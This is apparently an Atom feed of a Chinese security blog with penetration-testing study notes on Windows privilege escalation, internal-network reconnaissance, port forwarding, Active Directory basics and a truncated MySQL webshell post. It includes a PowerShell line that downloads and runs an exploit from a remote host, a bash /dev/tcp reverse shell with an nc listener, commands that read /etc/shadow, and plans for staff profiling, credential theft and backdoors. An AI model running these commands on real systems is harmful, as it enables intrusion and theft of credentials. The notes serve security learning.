<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zzggtt.github.io</id>
    <title>ZG0T01</title>
    <updated>2020-11-14T14:17:32.143Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zzggtt.github.io"/>
    <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://zzggtt.github.io/images/avatar.png</logo>
    <icon>https://zzggtt.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, ZG0T01</rights>
    <entry>
        <title type="html"><![CDATA[Windows下提权]]></title>
        <id>https://zzggtt.github.io/post/windows-xia-ti-quan/</id>
        <link href="https://zzggtt.github.io/post/windows-xia-ti-quan/">
        </link>
        <updated>2020-11-14T14:15:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="windows权限">Windows权限</h3>
<p>在Windows中，<strong>权限</strong>精确的定制了用户对<strong>资源</strong>的<strong>访问控制</strong>能力。也就是说，权限是以<strong>资源为对象</strong>，即某个资源对哪些用户可以拥有哪些权限。</p>
<ul>
<li>
<p><strong>安全标识符</strong></p>
<p>在Windows中系统通过安全标识符（SID）对用户进行<strong>识别</strong>，SID可应用于系统内的所有用户、组、服务或计算机。SID具有<strong>唯一性</strong>。</p>
</li>
<li>
<p><strong>访问控制列表</strong></p>
<p>访问控制列表（ACL）是权限的核心技术，用于规定用户对资源的访问权限。在访问控制列表中，每一个用户或用户组都对应一组访问控制项（Access Control Entry，ACE），所有用户或用户组的权限访问设置都将会在这里被存储下来，并允许随时被有权限进行修改的用户进行调整，如取消某个用户对某个资源的&quot;写入&quot;权限。</p>
</li>
<li>
<p><strong>安全主体</strong></p>
<p>在Windows中，可以将用户、用户组、计算机或服务都看成是一个安全主体，每个安全主体都拥有相对应的账户名称和SID。根据系统架构的不同，账户的管理方式也有所不同──本地账户被本地的SAM管理，域的账户则会被域控制器进行管理。</p>
<p>一般来说，权限的指派过程实际上就是为某个资源指定安全主体（即用户、用户组等）可以拥有怎样的操作过程。</p>
</li>
</ul>
<p><strong>参考资料：</strong></p>
<p><a href="https://www.cnblogs.com/milantgh/p/3617855.html">Windows之权限讲解</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1681365">Windows用户和组</a></p>
<p>Windows 内置用户账户：</p>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>权限</strong></th>
<th style="text-align:center"><strong>详细</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">User</td>
<td style="text-align:center">普通用户权限</td>
</tr>
<tr>
<td style="text-align:center">Administrator</td>
<td style="text-align:center">管理员权限。通常需要通过机制再提升为system权限来操作SAM（Mimikatz抓密码）</td>
</tr>
<tr>
<td style="text-align:center">System</td>
<td style="text-align:center">系统权限。可以操作SAM，需要从Administrator提升到SAM才能对散列值Dump</td>
</tr>
<tr>
<td style="text-align:center">TrustedInstaller</td>
<td style="text-align:center">最高权限，可以操作系统文件</td>
</tr>
</tbody>
</table>
<h3 id="内核漏洞提权">内核漏洞提权</h3>
<ol>
<li>
<p>将目标主机补丁号导出：</p>
<pre><code class="language-bash">systeminfo &gt; 1.txt
或
wmic qfe get Caption,Description,HotFixID,InstalledOn &gt; 1.txt
</code></pre>
</li>
<li>
<p>通过脚本判断是否存在未打补丁的漏洞：</p>
<p>https://github.com/bitsadmin/wesng.git</p>
<p>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p>
<p>或根据在线网站检测：</p>
<p>https://bugs.hacking8.com/tiquan</p>
</li>
<li>
<p>下载对应的EXP，并执行利用：</p>
<p>https://www.exploit-db.com/</p>
</li>
<li>
<p>可能遇到的问题：EXP被杀。将EXP改成Powershell，使用powershell下载利用代码并执行：</p>
<pre><code class="language-bash">Powershell IEX (New-Object Net.WebClient).DownloadString('http://X.X.X.X:8000/ms16-032.ps1');Invoke-MS16-032
</code></pre>
<p>参考：</p>
<p>https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html</p>
<p>https://www.cnblogs.com/xiaozi/p/13534602.html</p>
</li>
</ol>
<h3 id="dll劫持提权"><strong>DLL劫持提权</strong></h3>
<h4 id="基础介绍">基础介绍</h4>
<p>DLL是Microsoft引入的，用于实现共享库的概念。它是一个库文件，代表动态链接库，其中包含可被多个应用程序同时动态访问和使用的<strong>代码和数据</strong>。</p>
<p>Windows2003以上以及win7以上操作系统（<a href="http://sh1yan.top/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/">其他系统版本参考</a>），通过“<strong>DLL路径搜索目录顺序</strong>”和“<strong>KnownDLLs注册表项</strong>”的机制来确定应用程序启动时所要调用的DLL的路径，之后应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p>
<p>应用程序动态访问DLL的<strong>搜索目录顺序</strong>：</p>
<ol>
<li>从应用程序的目录中加载</li>
<li>32位系统目录（C：\ Windows \ System32）</li>
<li>16位系统目录（C：\ Windows \ System）</li>
<li>Windows目录（C：\ Windows）</li>
<li>当前工作目录（CWD）</li>
<li>PATH环境变量中的目录（首先是系统，然后是用户）</li>
</ol>
<p><strong>KnownDLLs注册表项机制</strong>：凡是此项下的DLL文件就会被禁止从应用程序自身所在的目录下调用，而只能从系统目录即<strong>SYSTEM32目录</strong>下调用。</p>
<p>注册表位置：</p>
<pre><code class="language-bash">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605363395360.png" alt="" loading="lazy"></figure>
<h4 id="利用条件"><strong>利用条件：</strong></h4>
<ul>
<li>
<p>DLL</p>
<p>可以看出，如果存在DLL即不在KnownDLLs里，开发人员也没有定义绝对路径时，应用程序就会按照目录顺序去搜索。</p>
</li>
<li>
<p>权限</p>
<p>当前用户有权限对要劫持的DLL目录进行<strong>读写</strong>操作。</p>
</li>
</ul>
<p>在上述条件下，我们就可以在应用程序搜索到system32之前，也就是应用程序目录中，放入我们编写好的恶意劫持DLL，等待应用程序调用。</p>
<h4 id="利用过程"><strong>利用过程：</strong></h4>
<p>参考倾旋师傅的文章：<a href="https://payloads.online/archivers/2018-06-09/1">QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</a></p>
<h3 id="错误的服务权限配置">错误的服务权限配置</h3>
<h4 id="基础介绍-2"><strong>基础介绍</strong></h4>
<p>通常情况下，一些Web控件、网络客户端会在本地计算机中注册一些<strong>服务</strong>，这些服务在<strong>开机后自启动</strong>，而自启动的<strong>权限又是SYSTEM</strong>。</p>
<p>在软件注册服务的时候，会在注册表中创建几个项，该项的注册表路径如下：</p>
<pre><code class="language-bash">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
</code></pre>
<p>服务在开机后自启动时，Windows将会搜索要执行的<a href="https://blog.csdn.net/simmel_92/article/details/89064977">二进制文件</a>。并在binPath属性中声明要执行的二进制文件的位置。如果二进制文件的路径不是一个绝对路径时，Windows将从路径开头的所有文件夹中进行搜索。</p>
<p>例如binPath路径如下：</p>
<pre><code class="language-bash">C:\Program Files\Unquoted Path Service\Common Files\service.exe
</code></pre>
<p>则搜索顺序为：</p>
<ol>
<li>C:\Program.exe</li>
<li>C:\Program Files\Unquoted.exe</li>
<li>C:\Program Files\Unquoted Path.exe</li>
<li>C:\Program Files\Unquoted Path Service\Common.exe</li>
<li>C:\Program Files\Unquoted Path Service\Common Files\service.exe</li>
</ol>
<h4 id="利用条件-2">利用条件：</h4>
<ul>
<li>若服务注册表的<strong>修改权限</strong>当前用户可控，那就可以直接修改<code>binPath</code>的值，指向到本地其他路径，获得这个服务的权限。</li>
<li>若这个binPath所指向的<strong>目录权限</strong>可控，那么我们也可以把二进制文件替换成木马，从而当服务启动的时候，就能够执行我们的木马。</li>
<li>若<code>binPath</code>的值<strong>不是一个绝对路径</strong>时，可以通过Windows的特性（按搜索顺序查找二进制文件）来提权：将木马放置在带有空格目录的同级目录下，当服务启动时，会首先在空格目录当前目录搜索第一个单词的二进制文件。</li>
</ul>
<h4 id="利用过程-2">利用过程：</h4>
<p>首先需要在找到存在配置权限错误的服务，<strong>PowerUp</strong>和<strong>winPEAS</strong>是最有用的工具，PowerUp用PowerShell编写，而winPEAS用C＃编写。将需要.NET Framework 4.0来运行winPEAS：</p>
<pre><code class="language-bash">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1605363418625.png" alt="" loading="lazy"></figure>
<p>关于Powerup的使用：<a href="https://evi1cg.me/archives/Powerup.html">Powrshell 提权框架-Powerup</a></p>
<p>接下来上传我们的木马，重启服务，即可获得该服务权限。</p>
<p>实际操作流程可参考：</p>
<p><a href="https://payloads.online/archivers/2018-10-08/1">Windows本地提权提升技巧</a></p>
<p><a href="https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842">Escalate Privileges in windows</a></p>
<p><a href="https://mp.weixin.qq.com/s/lNyvyW2Pq9abIC9ViJteaQ">红队测试之Windows提权小结</a></p>
<h3 id="mysql提权">Mysql提权</h3>
<p>搬运一下先知上总结好的文章：</p>
<p><a href="https://xz.aliyun.com/t/2719">Windows下三种mysql提权剖析</a></p>
<p><a href="https://xz.aliyun.com/t/7392">mysql数据库漏洞利用及提权方式小结</a></p>
<h3 id="协议提权potato">协议提权（Potato）</h3>
<p>土豆太多了，先mark一下，后面有时间再吃：</p>
<ul>
<li>
<p>Hot Potato</p>
<p>利用已知的Windows中的问题，以获得本地权限提升。</p>
<p>其中利用NTML中继（特别是基于HTTP &gt; SMB中继）和NBNS欺骗进行提权。</p>
<p><a href="https://www.freebuf.com/articles/system/93484.html">Windows提权姿势之Hot Potato</a></p>
</li>
<li>
<p>Rotten Potato</p>
<p><a href="https://www.anquanke.com/post/id/92908">The lonely potato</a></p>
</li>
<li>
<p>Juicy Potato</p>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">Windows本地提权工具Juicy Potato测试分析</a></p>
</li>
<li>
<p>Ghost Potato</p>
<p><a href="https://xz.aliyun.com/t/7087">Ghost Potato 复现(Cve-2019-1384)</a></p>
</li>
<li>
<p>Pipe Potato</p>
<p><a href="https://www.t00ls.net/articles-56281.html">pipePotato复现</a></p>
<p><a href="https://www.anquanke.com/post/id/204510">pipePotato：一种新型的通用提权漏洞</a></p>
</li>
<li>
<p>Potato家族本地提权细节</p>
<p>https://xz.aliyun.com/t/7776</p>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[如何进行内网信息搜索]]></title>
        <id>https://zzggtt.github.io/post/ru-he-jin-xing-nei-wang-xin-xi-sou-suo/</id>
        <link href="https://zzggtt.github.io/post/ru-he-jin-xing-nei-wang-xin-xi-sou-suo/">
        </link>
        <updated>2020-11-12T08:41:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>从亮神分享的文章中学到了很多，记录了下来：</p>
<blockquote>
<p>目标<code>资产信息</code>搜集的程度，决定<code>渗透过程</code>的复杂程度。</p>
<p>目标<code>主机信息</code>搜集的深度，决定后渗透<code>权限持续把控</code>。</p>
<p>渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。</p>
<p>——Micropoor</p>
</blockquote>
<p>一次完整的网络渗透，不仅仅是与目标管理人员的权限争夺，一次完整的网络渗透，它分为两大块，技 术业务与信息分析业务。</p>
<p>而技术业务要辅助并且要为信息分析业务提供强大的支撑与保证。同时信息分析业务要为技术业务提供 关键的目标信息分析逻辑关系与渗透方向。</p>
<p>在得到一个webshell时，非root/administrator权限的情况下，对目标信息搜集至关重要，它会影响到后期的渗透是否顺利，以及渗透方向。</p>
<h3 id="主机信息">主机信息</h3>
<p><strong>查询用户信息：</strong></p>
<p>了解当前用户权限，判断是否需要进一步提升权限。</p>
<pre><code class="language-bash">win：
	whoami：显示当前用户信息
	net user：显示主机系统中所有用户信息
linux：
	whoami
	id
	cat /etc/shadow、cat /etc/passwd
</code></pre>
<p><strong>查询网络信息：</strong></p>
<p>确认目标主机所连接的网络情况：</p>
<pre><code class="language-bash">win：
	TCP/IP配置：ipconfig、ipconfig /all
	端口：netstat -ano
	ARP表：arp -a 
	路由表: route print
	dns缓存记录：ipconfig/displaydns
linux：
	ifconfig、netstat -anplt
    ARP表:arp -a 
    路由表:route -n
    查看登录日志获取登录来源ip：lastlog
</code></pre>
<p><strong>查询系统信息：</strong></p>
<p>确认主机操作系统名称和版本信息</p>
<pre><code class="language-bash">win:
	systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
	systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;
Linux: 
	uname -a ：通过查看内核版本 
</code></pre>
<p><strong>查询补丁更新信息：</strong></p>
<p>获取当前主机补丁更新情况，可用来辅助<strong>提升权限</strong>。</p>
<pre><code class="language-bash">win：
	systeminfo
	wmic qfe get Caption,Description,HotFixID,InstalledOn
Linux: uname -a ：通过查看内核版本 
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605170574964.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1605170579520.png" alt="" loading="lazy"></figure>
<p><strong>查询进程列表：</strong></p>
<p>查看当前进程列表，重点关注安全软件，为了后续免杀做准备。</p>
<pre><code class="language-bash">win：
	tasklist
    wmic process list brief
linux: 
	ps
	top
</code></pre>
<p>注：要熟悉国内常见点杀软。</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1605170664939.png" alt="" loading="lazy"></figure>
<p><strong>查询安装的软件及版本、路径等</strong></p>
<pre><code class="language-bash">win:
	wmic product get name,version &gt; ins.txt : 通过wmic将命令信息导出
	powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; ：通过powershell命令收集软件的版本信息
	
linux:
	rpm -q：来查询安装了哪些软件包
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1605170621708.png" alt="" loading="lazy"></figure>
<p><strong>查询主机服务信息</strong></p>
<pre><code class="language-bash">wmic service list brief
</code></pre>
<h3 id="资产信息">资产信息</h3>
<p>服务器端存有敏感信息，通过收集各种登录凭证以便扩大战果。</p>
<pre><code class="language-bash">Windows：
	本地密码Hash和明文密码/抓取浏览器密码/服务端明文密码
linux：
	history记录敏感操作/shadow文件破解/mimipenguin抓取密码/使用Strace收集登录凭证/全盘搜索敏感信息
</code></pre>
<h3 id="域内信息收集"><strong>域内信息收集</strong></h3>
<p>搜集完本机相关信息后，就需要判断当前主机是否在域内，如果在域内，就需要进一步收集域内信息</p>
<p><strong>判断是否有域</strong><br>
一般域服务器都会同时作为时间服务器，所以使用下面命令判断：</p>
<pre><code class="language-bash">运行 net time /domain 该命令后，一般会有如下三种情况:
1、存在域，但当前用户不是域用户，提示说明权限不够
 	 C:\Users&gt;WWW&gt;net time /domain
 	 System error 5 has occurred.
 	 Access is denied.
 	 
2、存在域，并且当前用户是域用户
  	 C:\Windows\system32&gt;net time /domain
  	 Current time at \\owa.god.org is 2020/11/12 16:05:49
  	 The command completed successfully.
	
3、当前网络环境为工作组，不存在域
  	 C:\Users\Administrator&gt;net time /domain
  	 The domain controller for the domain WORKGROUP could not 	   be found.
</code></pre>
<p><strong>域用户信息搜集：</strong></p>
<pre><code class="language-bash">net user /domain //获取域用户列表
net group /domain  //查询域内所有用户组列表
net group “Domain Admins” /domain //查询“域管理员组用户”列表
net group &quot;Domain Controllers&quot; /domain  //查看“域控制器组”用户
net localgroup administrators /domain  //查询“本地管理员组”用户
</code></pre>
<p>正如上面所说，技术业务需要辅助分析业务。在域组中，其中有几个组需要特别关注，在一般的大型内 网渗透中，需要关注大致几个组</p>
<p>（1）IT组/研发组 他们掌握在大量的内网密码，数据库密码等。</p>
<p>（2）秘书组 他们掌握着大量的目标机构的内部传达文件，为信息分析业务提供信息，在反馈给技术业 务来确定渗透方向</p>
<p>（3）domain admins组 root/administrator</p>
<p>（4）财务组 他们掌握着大量的资金往来与目标企业的规划发展，并且可以通过资金，来判断出目标组 织的整体架构</p>
<p>（5）CXX组 ceo cto coo等，不同的目标组织名字不同，如部长，厂长，经理等。</p>
<p>以xxx组为例：xxx组共计x人。</p>
<p>并且开始规划信息刺探等级：</p>
<p>等级1：确定某部门具体人员数量 如研发中心4人</p>
<p>等级2：确定该部门的英文用户名的具体信息，如姓名，联系方式，邮箱，职务等。以便确定下一步攻 击方向</p>
<p>等级3：分别刺探白天/夜间 内网中所存活机器并且对应IP地址</p>
<p>等级4： 对应人员的工作机内网IP，以及工作时间</p>
<p>等级5： 根据信息业务反馈，制定目标安全时间，以便拖拽指定人员文件，或登录目标机器</p>
<p>等级6： 制定目标机器后渗透与持续渗透的方式以及后门</p>
<p>以上只是思路，后续内容可就不搬运了，详细内容可直接去GitHub：<a href="https://github.com/Micropoor/Micro8/blob/master/%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89%EF%BC%89.pdf">渗透的本质是信息收集</a></p>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1605170709895.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1605170713702.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1605170717677.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1605170721876.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1605170726984.png" alt="" loading="lazy"></figure>
<p><strong>找到域控</strong><br>
一般来说，域控服务器IP地址为DNS服务器地址，找到DNS服务器地址就可以定位域控</p>
<pre><code class="language-bash">nslookup/ping 域名,解析到域控服务器IP地址
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1605170731898.png" alt="" loading="lazy"></figure>
<h3 id="参考链接">参考链接</h3>
<p><a href="https://www.mi1k7ea.com/2020/02/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网信息收集之本机信息收集</a></p>
<p><a href="https://mp.weixin.qq.com/s/o19f28x50dDICcActdvqXw">如何进行内网信息收集</a></p>
<p><a href="https://github.com/Micropoor/Micro8/blob/master/%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89%EF%BC%89.pdf">渗透的本质是信息收集（第五十二课）</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[端口转发与边界代理]]></title>
        <id>https://zzggtt.github.io/post/duan-kou-zhuan-fa-yu-bian-jie-dai-li/</id>
        <link href="https://zzggtt.github.io/post/duan-kou-zhuan-fa-yu-bian-jie-dai-li/">
        </link>
        <updated>2020-11-05T14:35:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>大佬们总结的非常详细，做一个精神的搬运工，简单写写。</p>
<h3 id="1-为什么用代理"><strong>1、为什么用代理？</strong></h3>
<ul>
<li>
<p><strong>更隐蔽</strong></p>
<p>直接通过登陆服务器的方式往往会留下比较明显的痕迹，且动作太大容易被发现。而且很多时候权限也不够。</p>
</li>
<li>
<p><strong>更好的接触到目标所处环境</strong></p>
<p>渗透的过程中需要工具进行很辅助，如果目标机器缺少对应的环境变量或者组件，会导致渗透受阻。</p>
</li>
<li>
<p><strong>使用已有shell的机器，作为<code>跳板</code>，扩大战果</strong></p>
</li>
</ul>
<h3 id="2-正向和反向连接"><strong>2、正向和反向连接</strong></h3>
<ul>
<li>
<p><strong>正向连接：</strong></p>
<p>Client-&gt;Transit server-&gt;Server：Client能够正向连接Transit server。Transit server直接转发即可：</p>
</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1604845258240.png" alt="" loading="lazy"></figure>
<p>例如通过远程桌面连接服务器，SSH、TELNET等都是正向连接。</p>
<ul>
<li>
<p><strong>反向连接：</strong></p>
<p>Client&lt;-Transit server-&gt;Server：Client无法正向连接Transit server，但Transit server能够反向连接Client：</p>
</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1604845263837.png" alt="" loading="lazy"></figure>
<p>Client无法连接到Transit server，但Transit server能够反向连接到Client。</p>
<p>例如反弹shell就是典型的反向连接。</p>
<h3 id="3-端口转发和代理"><strong>3、端口转发和代理</strong></h3>
<p>参考连接：</p>
<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86/">渗透基础-端口转发与代理</a></p>
<p><a href="https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA">内网渗透之代理转发</a></p>
<p><a href="https://payloads.online/archivers/2018-02-02/1#0x09-metasploit-socks4a">内网渗透常见的端口转发的方式</a></p>
<h3 id="4-反弹shell"><strong>4、反弹shell</strong></h3>
<p>reverse shell，指被控制端产生一个交互式shell，并重定向shell的输入输出，为控制端的某端口。</p>
<p>为什么要反弹shell？</p>
<p>当我们获得一个webshell后，通常用于被控端因防火墙受限、权限不足、端口被占用等情形，无法通过远程桌面或SSH的形式直接登陆目标服务器时，反弹shell就很重要了。</p>
<p>以Linux下反弹shell为例：</p>
<p><strong>被控制端：</strong></p>
<pre><code class="language-bash">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1
</code></pre>
<p>通过bash产生一个交互式shell，并指定其输入输出为192.168.146.129的2333端口。</p>
<p>在控制方监听端口的情况下对这个文件（/dev/tcp|udp/ip/port）进行读写，就能实现与监听端口的服务器的<code>socket通信</code></p>
<p><strong>控制端：</strong></p>
<pre><code class="language-bash">nc -lvp 2333
</code></pre>
<p>通过nc监听2333端口</p>
<p>参考链接：</p>
<p><a href="https://xz.aliyun.com/t/2549#toc-9">Linux反弹shell的本质</a></p>
<h3 id="5-代理的本质-socks协议">5、代理的本质-Socks协议</h3>
<p>SOCKS协议位于传输层(TCP/UDP等)与应用层之间，是最基本的<code>代理协议</code>，它是一种可以穿越防火墙的协议，例如想要上Google就得....</p>
<p>目前有两个版本：SOCKS4和SOCKS5：</p>
<p>SOCKS4支持TELNET、FTPHTTP等TCP协议；</p>
<p>SOCKS5支持TCP与UDP，并支持安全认证方案。</p>
<p>Ps: Socks不支持ICMP，不能使用ping命令。。记住哦~~~</p>
<p>所以SOCKS能代理TCP和UDP的网络流量，对于它之下的网络流量，就无能为力了。</p>
<p>SOCKS是怎么工作的呢，这里举个例子：</p>
<p>A想访问B站点，但是A和B站点之间有一个防火墙阻止A直接访问B站点，在A的网络里面有一个SOCKS代理C，C可以直接访问B站点，所以A通知C他想访问B站点，C就为A和B之间架起一条沟通的通道。</p>
<p>更详细的内容可参考：<a href="https://geesun.github.io/posts/2015/09/socks5_protocol.html">SOCKS 5协议简析</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域环境搭建]]></title>
        <id>https://zzggtt.github.io/post/nei-wang-shen-tou-ji-chu/</id>
        <link href="https://zzggtt.github.io/post/nei-wang-shen-tou-ji-chu/">
        </link>
        <updated>2020-11-03T12:19:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>本想记录一下搭建域环境的学习过程，但是发现倾旋师傅的文章<a href="https://payloads.online/archivers/2019-04-13/1">最快的方式搭建域环境</a>写的非常详细，于是准备写一写有关于域的相关基础知识。</p>
<h3 id="域和工作组">域和工作组</h3>
<ul>
<li>
<p><strong>工作组</strong></p>
<p>工作组是最简单的Windows资源管理模式，它具有<code>分布式管理</code>功能。每个用户独立的管理自己的计算机，只能在其计算机上使用其登陆凭证进行登录。大多数存储是分布式的。每个设备都有自己的专用存储。</p>
</li>
<li>
<p><strong>域</strong></p>
<p>域是客户端/服务器的网络资源管理模式，具有<code>集中管理</code>功能。用户使用其登陆凭证可以在域中的任何设备登录，所有设备都可以在集中设备（DC）上进行管理，所有用户数据都集中存储。</p>
</li>
</ul>
<p><strong>区别</strong>：</p>
<table>
<thead>
<tr>
<th style="text-align:center">序号</th>
<th style="text-align:center">域</th>
<th style="text-align:center">工作组</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1、</td>
<td style="text-align:center">域中的计算机具有集中式数据库。</td>
<td style="text-align:center">工作组中的计算机主要具有自己的本地数据库。</td>
</tr>
<tr>
<td style="text-align:center">2、</td>
<td style="text-align:center">域主要是仅传输和共享敏感的重要数据。</td>
<td style="text-align:center">工作组仅由于安全性较低而用于共享安全性和个人数据较少的内容。</td>
</tr>
<tr>
<td style="text-align:center">3、</td>
<td style="text-align:center">域主要是大型公共和企业网络的首选。</td>
<td style="text-align:center">工作组主要是小型局域网的首选，例如学校，学院，建筑物等。</td>
</tr>
<tr>
<td style="text-align:center">4、</td>
<td style="text-align:center">由于安全性，域用于传输和共享敏感的重要数据。</td>
<td style="text-align:center">由于安全性较低，工作组用于共享个人数据。</td>
</tr>
<tr>
<td style="text-align:center">5、</td>
<td style="text-align:center">域对于大量设备可以更好地工作。</td>
<td style="text-align:center">工作组对较少的计算机更好地工作。</td>
</tr>
<tr>
<td style="text-align:center">6、</td>
<td style="text-align:center">域名由域控制器根据IP地址提供。</td>
<td style="text-align:center">在工作组中，没有任何依赖于硬件组件和服务器的名称分配。</td>
</tr>
<tr>
<td style="text-align:center">7、</td>
<td style="text-align:center">可以从集中式存储中的域中恢复数据。</td>
<td style="text-align:center">由于每个设备的本地存储，因此无法在工作组中进行数据恢复。</td>
</tr>
<tr>
<td style="text-align:center">8、</td>
<td style="text-align:center">可以使用一个或多个不同网络域的设备并向其中添加所有预期的设备来形成域。</td>
<td style="text-align:center">同一网络中的设备只能添加到工作组中。</td>
</tr>
</tbody>
</table>
<h3 id="dcdomain-controller">DC（Domain Controller）</h3>
<p>在域管理模式下，负责响应Windows Server域中的安全身份验证请求的服务器称为“域控制器（Domain Controller，简写为DC）。网络管理员通过在<code>域控制器</code>上集中管理大量的pc机。</p>
<p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的<code>数据库</code>。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。</p>
<h3 id="adactive-directory">AD（Active Directory）</h3>
<p>Active Directory（AD）是Microsoft专有的<code>目录服务</code>。它在Windows Server上运行，用于管理网络上的设备和资源。</p>
<p>目录是一种分层结构，用于存储有关网络上对象的信息。而目录服务，例如Active Directory域服务（AD DS），提供了用于<code>存储目录数据</code>，并使网络用户和管理员可以<code>使用此数据</code>的方法。</p>
<p>域内所有的计算机共享一个集中式的目录数据库（又称为AD数据库），它包含着整个域内的<code>对象</code>（用户账户、计算机账户、打印机、共享文件等）和安全信息等等，而活动目录负责目录数据库的操作（增删修改）。</p>
<p>所以建立域控制器服务器的过程，其实就是安装AD的过程。</p>
<h3 id="域-树-林-组织单位">域、树、林、组织单位</h3>
<p>Active Directory域服务使用由域，树和林组成的分层布局来协调网络元素。</p>
<ul>
<li>
<p>域</p>
<p>域是一组对象。如用户或设备，共享相同AD数据库。域具有域名系统（DNS）结构。</p>
</li>
<li>
<p>树</p>
<p>树是是组合在一起的一个或多个域。树结构使用连续的名称空间来收集逻辑层次结构中的域集合。可以将树视为信任关系，其中在两个域之间共享安全连接或信任。</p>
</li>
<li>
<p>林</p>
<p>林是有一棵或多棵域树组成的，每棵域树独享连续的命名空间，不同域树之间没有命名空间的连续性。林中第一棵域树的根域也整个林的根域，同时也是林的名称。</p>
</li>
<li>
<p>组织单位</p>
<p>组织用户，组和设备。每个域可以包含自己的OU。但是，OU不能具有单独的名称空间，因为域中的每个用户或对象都必须是唯一的。例如，无法创建具有相同用户名的用户帐户。</p>
</li>
</ul>
<p><strong>参考链接：</strong></p>
<p>https://www.geeksforgeeks.org/difference-between-domain-and-workgroup/</p>
<p>https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</p>
<p>https://blog.csdn.net/qq_39101049/article/details/99678671</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Mysql注入点写Webshell]]></title>
        <id>https://zzggtt.github.io/post/mysql-zhu-ru-dian-xie-webshell/</id>
        <link href="https://zzggtt.github.io/post/mysql-zhu-ru-dian-xie-webshell/">
        </link>
        <updated>2020-10-28T01:52:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="基础知识">基础知识</h2>
<h3 id="指令基础">指令基础</h3>
<p>在 MySQL 中，可以使用 SELECTI...INTO OUTFILE 语句，将表的数据导出成一个文件。</p>
<p>语法格式如下：</p>
